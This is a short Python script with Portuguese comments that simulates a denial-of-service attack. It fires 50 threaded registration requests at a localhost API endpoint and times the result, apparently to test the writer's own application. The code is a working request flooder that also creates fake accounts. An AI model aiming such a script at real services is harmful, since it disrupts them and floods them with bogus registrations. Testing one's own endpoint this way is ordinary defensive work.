# ataque_dos.py
# Simula um ataque de negação de serviço ao endpoint de registo.

import requests
import time
from threading import Thread

API_URL = "http://127.0.0.1:5000/api/register"
NUMERO_DE_REQUISICOES = 50 # Vamos começar com 50 para não sobrecarregar demais o seu PC

def fazer_pedido(numero_do_ataque):
    """Função que um 'zumbi' do nosso ataque irá executar."""
    nome_cliente = f"atacante_{numero_do_ataque}"
    email = f"ataque{numero_do_ataque}@email.com"
    senha = "password_fraca"
    
    try:
        resposta = requests.post(API_URL, json={
            "nome_cliente": nome_cliente,
            "email": email,
            "senha": senha
        })
        if resposta.status_code == 201:
            print(f"Sucesso: 'zumbi' {numero_do_ataque} criou uma conta.")
        else:
            # Mostra um erro se o utilizador já existir (de um ataque anterior)
            print(f"Falha: 'zumbi' {numero_do_ataque} recebeu o código {resposta.status_code}. Detalhe: {resposta.text}")
    except requests.exceptions.RequestException as e:
        print(f"Erro de conexão no 'zumbi' {numero_do_ataque}: {e}")


if __name__ == "__main__":
    print("--- INICIANDO ATAQUE DE NEGAÇÃO DE SERVIÇO ---")
    print(f"Alvo: {API_URL}")
    print(f"A disparar {NUMERO_DE_REQUISICOES} pedidos de registo em paralelo...")
    
    inicio = time.time()
    
    threads = []
    for i in range(NUMERO_DE_REQUISICOES):
        # Criamos uma thread para cada pedido, para os fazer quase ao mesmo tempo
        thread = Thread(target=fazer_pedido, args=(i,))
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        # Esperamos que todos os "zumbis" terminem o seu trabalho
        thread.join()
        
    fim = time.time()
    
    print("\n--- ATAQUE CONCLUÍDO ---")
    print(f"Tempo total para {NUMERO_DE_REQUISICOES} registos: {fim - inicio:.2f} segundos.")